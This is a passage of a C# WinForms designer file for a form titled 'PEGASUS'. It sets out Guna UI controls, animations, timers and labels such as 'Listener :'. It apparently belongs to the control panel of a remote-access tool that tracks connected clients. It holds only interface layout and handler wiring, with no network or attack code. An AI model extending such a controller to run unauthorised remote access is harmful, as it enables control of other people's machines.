            this.guna2ControlBox3.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MinimizeBox;
            this.loadForm.SetDecoration(this.guna2ControlBox3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2ControlBox3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2ControlBox3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2ControlBox3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2ControlBox3.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.guna2ControlBox3.HoverState.BorderColor = System.Drawing.Color.DimGray;
            this.guna2ControlBox3.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2ControlBox3.HoverState.IconColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2ControlBox3.IconColor = System.Drawing.Color.DarkGray;
            this.guna2ControlBox3.Location = new System.Drawing.Point(1459, 13);
            this.guna2ControlBox3.Name = "guna2ControlBox3";
            this.guna2ControlBox3.Size = new System.Drawing.Size(40, 29);
            this.guna2ControlBox3.TabIndex = 146;
            // 
            // guna2Separator4
            // 
            this.guna2Separator4.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2Separator4.BackColor = System.Drawing.Color.Transparent;
            this.loadForm.SetDecoration(this.guna2Separator4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2Separator4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2Separator4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2Separator4, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Separator4.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2Separator4.Location = new System.Drawing.Point(0, -5);
            this.guna2Separator4.Name = "guna2Separator4";
            this.guna2Separator4.Size = new System.Drawing.Size(1564, 10);
            this.guna2Separator4.TabIndex = 143;
            this.guna2Separator4.UseTransparentBackground = true;
            // 
            // guna2ToggleSwitch1
            // 
            this.guna2ToggleSwitch1.CheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(34)))), ((int)(((byte)(34)))), ((int)(((byte)(34)))));
            this.guna2ToggleSwitch1.CheckedState.BorderRadius = 1;
            this.guna2ToggleSwitch1.CheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(32)))), ((int)(((byte)(32)))), ((int)(((byte)(32)))));
            this.guna2ToggleSwitch1.CheckedState.InnerBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(34)))), ((int)(((byte)(34)))), ((int)(((byte)(34)))));
            this.guna2ToggleSwitch1.CheckedState.InnerBorderRadius = 1;
            this.guna2ToggleSwitch1.CheckedState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.loadForm.SetDecoration(this.guna2ToggleSwitch1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2ToggleSwitch1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2ToggleSwitch1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2ToggleSwitch1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2ToggleSwitch1.Location = new System.Drawing.Point(157, 13);
            this.guna2ToggleSwitch1.Name = "guna2ToggleSwitch1";
            this.guna2ToggleSwitch1.Size = new System.Drawing.Size(65, 25);
            this.guna2ToggleSwitch1.TabIndex = 142;
            this.guna2ToggleSwitch1.UncheckedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(34)))), ((int)(((byte)(34)))), ((int)(((byte)(34)))));
            this.guna2ToggleSwitch1.UncheckedState.BorderRadius = 1;
            this.guna2ToggleSwitch1.UncheckedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(32)))), ((int)(((byte)(32)))), ((int)(((byte)(32)))));
            this.guna2ToggleSwitch1.UncheckedState.InnerBorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(34)))), ((int)(((byte)(34)))), ((int)(((byte)(34)))));
            this.guna2ToggleSwitch1.UncheckedState.InnerBorderRadius = 1;
            this.guna2ToggleSwitch1.UncheckedState.InnerColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2ToggleSwitch1.CheckedChanged += new System.EventHandler(this.guna2ToggleSwitch1_CheckedChanged);
            // 
            // guna2ControlBox2
            // 
            this.guna2ControlBox2.Anchor = ((System.Windows.Forms.AnchorStyles)((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2ControlBox2.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2ControlBox2.BorderThickness = 1;
            this.guna2ControlBox2.ControlBoxType = Guna.UI2.WinForms.Enums.ControlBoxType.MaximizeBox;
            this.loadForm.SetDecoration(this.guna2ControlBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2ControlBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2ControlBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2ControlBox2, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2ControlBox2.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))), ((int)(((byte)(30)))));
            this.guna2ControlBox2.HoverState.BorderColor = System.Drawing.Color.DimGray;
            this.guna2ControlBox2.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2ControlBox2.HoverState.IconColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2ControlBox2.IconColor = System.Drawing.Color.DarkGray;
            this.guna2ControlBox2.Location = new System.Drawing.Point(1510, 13);
            this.guna2ControlBox2.Name = "guna2ControlBox2";
            this.guna2ControlBox2.Size = new System.Drawing.Size(40, 29);
            this.guna2ControlBox2.TabIndex = 145;
            // 
            // guna2Separator3
            // 
            this.guna2Separator3.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2Separator3.BackColor = System.Drawing.Color.Transparent;
            this.loadForm.SetDecoration(this.guna2Separator3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2Separator3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2Separator3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2Separator3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Separator3.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2Separator3.Location = new System.Drawing.Point(0, 46);
            this.guna2Separator3.Name = "guna2Separator3";
            this.guna2Separator3.Size = new System.Drawing.Size(1559, 10);
            this.guna2Separator3.TabIndex = 17;
            this.guna2Separator3.UseTransparentBackground = true;
            // 
            // label7
            // 
            this.label7.AutoSize = true;
            this.label7.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.loadForm.SetDecoration(this.label7, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.label7, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.label7, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.label7, Guna.UI2.AnimatorNS.DecorationType.None);
            this.label7.Font = new System.Drawing.Font("Electrolize", 8.999999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label7.Location = new System.Drawing.Point(95, 18);
            this.label7.Name = "label7";
            this.label7.Size = new System.Drawing.Size(58, 15);
            this.label7.TabIndex = 16;
            this.label7.Text = "Listener :";
            // 
            // label5
            // 
            this.label5.AutoSize = true;
            this.label5.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.loadForm.SetDecoration(this.label5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.label5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.label5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.label5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.label5.Font = new System.Drawing.Font("Electrolize", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label5.ForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.label5.Location = new System.Drawing.Point(327, 16);
            this.label5.Name = "label5";
            this.label5.Size = new System.Drawing.Size(50, 19);
            this.label5.TabIndex = 12;
            this.label5.Text = "User";
            // 
            // label6
            // 
            this.label6.AutoSize = true;
            this.label6.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.loadForm.SetDecoration(this.label6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.label6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.label6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.label6, Guna.UI2.AnimatorNS.DecorationType.None);
            this.label6.Font = new System.Drawing.Font("Electrolize", 12F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label6.ForeColor = System.Drawing.Color.Silver;
            this.label6.Location = new System.Drawing.Point(233, 16);
            this.label6.Name = "label6";
            this.label6.Size = new System.Drawing.Size(88, 19);
            this.label6.TabIndex = 11;
            this.label6.Text = "Welcome:";
            // 
            // guna2Separator1
            // 
            this.guna2Separator1.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Bottom | System.Windows.Forms.AnchorStyles.Left) 
            | System.Windows.Forms.AnchorStyles.Right)));
            this.guna2Separator1.BackColor = System.Drawing.Color.Transparent;
            this.loadForm.SetDecoration(this.guna2Separator1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2Separator1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2Separator1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2Separator1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Separator1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2Separator1.Location = new System.Drawing.Point(0, 76);
            this.guna2Separator1.Name = "guna2Separator1";
            this.guna2Separator1.Size = new System.Drawing.Size(1876, 11);
            this.guna2Separator1.TabIndex = 9;
            this.guna2Separator1.UseTransparentBackground = true;
            // 
            // label1
            // 
            this.label1.Anchor = System.Windows.Forms.AnchorStyles.Top;
            this.label1.AutoSize = true;
            this.label1.BackColor = System.Drawing.Color.Transparent;
            this.loadForm.SetDecoration(this.label1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.label1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.label1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.label1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.label1.Font = new System.Drawing.Font("Century Gothic", 15.75F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.label1.Location = new System.Drawing.Point(745, 16);
            this.label1.Name = "label1";
            this.label1.Size = new System.Drawing.Size(105, 25);
            this.label1.TabIndex = 10;
            this.label1.Text = "PEGASUS";
            // 
            // guna2PictureBox5
            // 
            this.guna2Transition2.SetDecoration(this.guna2PictureBox5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2PictureBox5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2PictureBox5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.guna2PictureBox5, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2PictureBox5.Image = ((System.Drawing.Image)(resources.GetObject("guna2PictureBox5.Image")));
            this.guna2PictureBox5.ImageRotate = 0F;
            this.guna2PictureBox5.Location = new System.Drawing.Point(17, 0);
            this.guna2PictureBox5.Name = "guna2PictureBox5";
            this.guna2PictureBox5.Size = new System.Drawing.Size(49, 54);
            this.guna2PictureBox5.SizeMode = System.Windows.Forms.PictureBoxSizeMode.Zoom;
            this.guna2PictureBox5.TabIndex = 147;
            this.guna2PictureBox5.TabStop = false;
            // 
            // guna2VSeparator3
            // 
            this.guna2VSeparator3.Anchor = ((System.Windows.Forms.AnchorStyles)(((System.Windows.Forms.AnchorStyles.Top | System.Windows.Forms.AnchorStyles.Bottom) 
            | System.Windows.Forms.AnchorStyles.Left)));
            this.guna2VSeparator3.BackColor = System.Drawing.Color.Transparent;
            this.loadForm.SetDecoration(this.guna2VSeparator3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.guna2VSeparator3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2VSeparator3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2VSeparator3, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2VSeparator3.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2VSeparator3.Location = new System.Drawing.Point(-5, 1);
            this.guna2VSeparator3.Name = "guna2VSeparator3";
            this.guna2VSeparator3.Size = new System.Drawing.Size(10, 53);
            this.guna2VSeparator3.TabIndex = 144;
            // 
            // guna2VScrollBar1
            // 
            this.guna2VScrollBar1.BindingContainer = this.listView1;
            this.guna2VScrollBar1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2Transition2.SetDecoration(this.guna2VScrollBar1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.guna2VScrollBar1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.guna2VScrollBar1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.guna2VScrollBar1, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2VScrollBar1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2VScrollBar1.HoverState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2VScrollBar1.HoverState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2VScrollBar1.HoverState.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2VScrollBar1.InUpdate = false;
            this.guna2VScrollBar1.LargeChange = 10;
            this.guna2VScrollBar1.Location = new System.Drawing.Point(1530, 3);
            this.guna2VScrollBar1.Name = "guna2VScrollBar1";
            this.guna2VScrollBar1.PressedState.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(22)))), ((int)(((byte)(25)))), ((int)(((byte)(35)))));
            this.guna2VScrollBar1.PressedState.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2VScrollBar1.PressedState.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2VScrollBar1.ScrollbarSize = 18;
            this.guna2VScrollBar1.Size = new System.Drawing.Size(18, 724);
            this.guna2VScrollBar1.TabIndex = 20;
            this.guna2VScrollBar1.ThumbColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2VScrollBar1.ThumbStyle = Guna.UI2.WinForms.Enums.ThumbStyle.Inset;
            // 
            // miniToolStrip
            // 
            this.miniToolStrip.AccessibleName = "New item selection";
            this.miniToolStrip.AccessibleRole = System.Windows.Forms.AccessibleRole.ButtonDropDown;
            this.miniToolStrip.AutoSize = false;
            this.miniToolStrip.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.miniToolStrip.BackgroundImage = ((System.Drawing.Image)(resources.GetObject("miniToolStrip.BackgroundImage")));
            this.miniToolStrip.BackgroundImageLayout = System.Windows.Forms.ImageLayout.Center;
            this.guna2Transition2.SetDecoration(this.miniToolStrip, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.miniToolStrip, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.miniToolStrip, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this.miniToolStrip, Guna.UI2.AnimatorNS.DecorationType.None);
            this.miniToolStrip.Dock = System.Windows.Forms.DockStyle.None;
            this.miniToolStrip.Font = new System.Drawing.Font("Electrolize", 8.999999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.miniToolStrip.ImageScalingSize = new System.Drawing.Size(24, 24);
            this.miniToolStrip.Location = new System.Drawing.Point(133, 1);
            this.miniToolStrip.Name = "miniToolStrip";
            this.miniToolStrip.Padding = new System.Windows.Forms.Padding(1, 0, 9, 0);
            this.miniToolStrip.Size = new System.Drawing.Size(961, 22);
            this.miniToolStrip.SizingGrip = false;
            this.miniToolStrip.TabIndex = 14;
            // 
            // LISTVIEWPANEL0
            // 
            this.LISTVIEWPANEL0.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.LISTVIEWPANEL0.Controls.Add(this.LISTVIEWSPANEL1);
            this.LISTVIEWPANEL0.Controls.Add(this.guna2Panel1);
            this.loadForm.SetDecoration(this.LISTVIEWPANEL0, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this.LISTVIEWPANEL0, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this.LISTVIEWPANEL0, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition2.SetDecoration(this.LISTVIEWPANEL0, Guna.UI2.AnimatorNS.DecorationType.None);
            this.LISTVIEWPANEL0.Dock = System.Windows.Forms.DockStyle.Fill;
            this.LISTVIEWPANEL0.EdgeWidth = 1;
            this.LISTVIEWPANEL0.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.LISTVIEWPANEL0.Location = new System.Drawing.Point(0, 0);
            this.LISTVIEWPANEL0.Name = "LISTVIEWPANEL0";
            this.LISTVIEWPANEL0.ShadowColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.LISTVIEWPANEL0.ShadowDepth = 200;
            this.LISTVIEWPANEL0.ShadowStyle = Guna.UI2.WinForms.Guna2ShadowPanel.ShadowMode.Dropped;
            this.LISTVIEWPANEL0.Size = new System.Drawing.Size(1611, 848);
            this.LISTVIEWPANEL0.TabIndex = 13;
            this.LISTVIEWPANEL0.Visible = false;
            // 
            // guna2Transition2
            // 
            this.guna2Transition2.AnimationType = Guna.UI2.AnimatorNS.AnimationType.Particles;
            this.guna2Transition2.Cursor = null;
            animation3.AnimateOnlyDifferences = true;
            animation3.BlindCoeff = ((System.Drawing.PointF)(resources.GetObject("animation3.BlindCoeff")));
            animation3.LeafCoeff = 0F;
            animation3.MaxTime = 1F;
            animation3.MinTime = 0F;
            animation3.MosaicCoeff = ((System.Drawing.PointF)(resources.GetObject("animation3.MosaicCoeff")));
            animation3.MosaicShift = ((System.Drawing.PointF)(resources.GetObject("animation3.MosaicShift")));
            animation3.MosaicSize = 1;
            animation3.Padding = new System.Windows.Forms.Padding(100, 50, 100, 150);
            animation3.RotateCoeff = 0F;
            animation3.RotateLimit = 0F;
            animation3.ScaleCoeff = ((System.Drawing.PointF)(resources.GetObject("animation3.ScaleCoeff")));
            animation3.SlideCoeff = ((System.Drawing.PointF)(resources.GetObject("animation3.SlideCoeff")));
            animation3.TimeCoeff = 2F;
            animation3.TransparencyCoeff = 0F;
            this.guna2Transition2.DefaultAnimation = animation3;
            // 
            // guna2NotificationPaint1
            // 
            this.guna2NotificationPaint1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2NotificationPaint1.FillColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2NotificationPaint1.Font = new System.Drawing.Font("Electrolize", 8.23F, System.Drawing.FontStyle.Bold);
            // 
            // loadForm
            // 
            this.loadForm.AnimationType = Guna.UI2.AnimatorNS.AnimationType.Particles;
            this.loadForm.Cursor = null;
            animation2.AnimateOnlyDifferences = true;
            animation2.BlindCoeff = ((System.Drawing.PointF)(resources.GetObject("animation2.BlindCoeff")));
            animation2.LeafCoeff = 0F;
            animation2.MaxTime = 1F;
            animation2.MinTime = 0F;
            animation2.MosaicCoeff = ((System.Drawing.PointF)(resources.GetObject("animation2.MosaicCoeff")));
            animation2.MosaicShift = ((System.Drawing.PointF)(resources.GetObject("animation2.MosaicShift")));
            animation2.MosaicSize = 1;
            animation2.Padding = new System.Windows.Forms.Padding(100, 50, 100, 150);
            animation2.RotateCoeff = 0F;
            animation2.RotateLimit = 0F;
            animation2.ScaleCoeff = ((System.Drawing.PointF)(resources.GetObject("animation2.ScaleCoeff")));
            animation2.SlideCoeff = ((System.Drawing.PointF)(resources.GetObject("animation2.SlideCoeff")));
            animation2.TimeCoeff = 2F;
            animation2.TransparencyCoeff = 0F;
            this.loadForm.DefaultAnimation = animation2;
            // 
            // guna2Transition3
            // 
            this.guna2Transition3.AnimationType = Guna.UI2.AnimatorNS.AnimationType.Mosaic;
            this.guna2Transition3.Cursor = null;
            animation1.AnimateOnlyDifferences = true;
            animation1.BlindCoeff = ((System.Drawing.PointF)(resources.GetObject("animation1.BlindCoeff")));
            animation1.LeafCoeff = 0F;
            animation1.MaxTime = 1F;
            animation1.MinTime = 0F;
            animation1.MosaicCoeff = ((System.Drawing.PointF)(resources.GetObject("animation1.MosaicCoeff")));
            animation1.MosaicShift = ((System.Drawing.PointF)(resources.GetObject("animation1.MosaicShift")));
            animation1.MosaicSize = 20;
            animation1.Padding = new System.Windows.Forms.Padding(30);
            animation1.RotateCoeff = 0F;
            animation1.RotateLimit = 0F;
            animation1.ScaleCoeff = ((System.Drawing.PointF)(resources.GetObject("animation1.ScaleCoeff")));
            animation1.SlideCoeff = ((System.Drawing.PointF)(resources.GetObject("animation1.SlideCoeff")));
            animation1.TimeCoeff = 0F;
            animation1.TransparencyCoeff = 0F;
            this.guna2Transition3.DefaultAnimation = animation1;
            // 
            // guna2HtmlToolTip1
            // 
            this.guna2HtmlToolTip1.AllowLinksHandling = true;
            this.guna2HtmlToolTip1.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.guna2HtmlToolTip1.BorderColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2HtmlToolTip1.MaximumSize = new System.Drawing.Size(0, 0);
            this.guna2HtmlToolTip1.TitleFont = new System.Drawing.Font("Electrolize", 8.999999F, System.Drawing.FontStyle.Bold, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.guna2HtmlToolTip1.TitleForeColor = System.Drawing.Color.FromArgb(((int)(((byte)(54)))), ((int)(((byte)(193)))), ((int)(((byte)(214)))));
            this.guna2HtmlToolTip1.ToolTipIcon = System.Windows.Forms.ToolTipIcon.Info;
            this.guna2HtmlToolTip1.ToolTipTitle = "PEGASUS";
            // 
            // ping
            // 
            this.ping.Enabled = true;
            this.ping.Interval = 30000;
            this.ping.Tick += new System.EventHandler(this.ping_Tick);
            // 
            // UpdateUI
            // 
            this.UpdateUI.Enabled = true;
            this.UpdateUI.Interval = 500;
            this.UpdateUI.Tick += new System.EventHandler(this.UpdateUI_Tick);
            // 
            // ConnectTimeout
            // 
            this.ConnectTimeout.Enabled = true;
            this.ConnectTimeout.Interval = 5000;
            this.ConnectTimeout.Tick += new System.EventHandler(this.ConnectTimeout_Tick);
            // 
            // TimerTask
            // 
            this.TimerTask.Enabled = true;
            this.TimerTask.Interval = 5000;
            this.TimerTask.Tick += new System.EventHandler(this.TimerTask_Tick);
            // 
            // performanceCounter1
            // 
            this.performanceCounter1.CategoryName = "Processor";
            this.performanceCounter1.CounterName = "% Processor Time";
            this.performanceCounter1.InstanceName = "_Total";
            // 
            // performanceCounter2
            // 
            this.performanceCounter2.CategoryName = "Memory";
            this.performanceCounter2.CounterName = "% Committed Bytes In Use";
            // 
            // imageList2
            // 
            this.imageList2.ImageStream = ((System.Windows.Forms.ImageListStreamer)(resources.GetObject("imageList2.ImageStream")));
            this.imageList2.TransparentColor = System.Drawing.Color.Transparent;
            this.imageList2.Images.SetKeyName(0, "stop_48px.png");
            this.imageList2.Images.SetKeyName(1, "play_48px.png");
            // 
            // PEGALISIUS
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 14F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.AutoSize = true;
            this.BackColor = System.Drawing.Color.FromArgb(((int)(((byte)(25)))), ((int)(((byte)(27)))), ((int)(((byte)(38)))));
            this.ClientSize = new System.Drawing.Size(1611, 848);
            this.Controls.Add(this.LISTVIEWPANEL0);
            this.Controls.Add(this.tabControl1);
            this.Controls.Add(this.panel2);
            this.Controls.Add(this.panel3);
            this.guna2Transition2.SetDecoration(this, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition1.SetDecoration(this, Guna.UI2.AnimatorNS.DecorationType.None);
            this.guna2Transition3.SetDecoration(this, Guna.UI2.AnimatorNS.DecorationType.None);
            this.loadForm.SetDecoration(this, Guna.UI2.AnimatorNS.DecorationType.None);
            this.Font = new System.Drawing.Font("Electrolize", 8.249999F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.ForeColor = System.Drawing.Color.LightGray;
            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.None;
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.Margin = new System.Windows.Forms.Padding(2);
            this.Name = "PEGALISIUS";
            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
            this.Text = "PEGASUS";
            this.Activated += new System.EventHandler(this.PEGASUS_M_Activated);
            this.Deactivate += new System.EventHandler(this.PEGASUS_M_Deactivate);
            this.FormClosed += new System.Windows.Forms.FormClosedEventHandler(this.PEGASUS_M_FormClosed);
            this.Load += new System.EventHandler(this.PEGASUSM);
            this.contextMenuLogs.ResumeLayout(false);
            this.contextMenuThumbnail.ResumeLayout(false);
            this.guna2ContextMenuStrip2.ResumeLayout(false);
            this.guna2ContextMenuStrip3.ResumeLayout(false);
            this.guna2ContextMenuStrip1.ResumeLayout(false);
            this.LISTVIEWTASKS.ResumeLayout(false);
            ((System.ComponentModel.ISupportInitialize)(this.guna2PictureBox1)).EndInit();
            this.guna2Panel1.ResumeLayout(false);
            this.LISTVIEWSPANEL1.ResumeLayout(false);
            this.guna2TabControl1.ResumeLayout(false);
            this.tabPage1.ResumeLayout(false);
            this.guna2Panel2.ResumeLayout(false);
            this.guna2Panel2.PerformLayout();
            this.statusStrip1.ResumeLayout(false);
            this.statusStrip1.PerformLayout();
            this.tabPage2.ResumeLayout(false);
            this.tabPage3.ResumeLayout(false);
            this.guna2ContextMenuStrip4.ResumeLayout(false);
            this.tabPage4.ResumeLayout(false);
            this.guna2Panel4.ResumeLayout(false);
            this.guna2Panel4.PerformLayout();
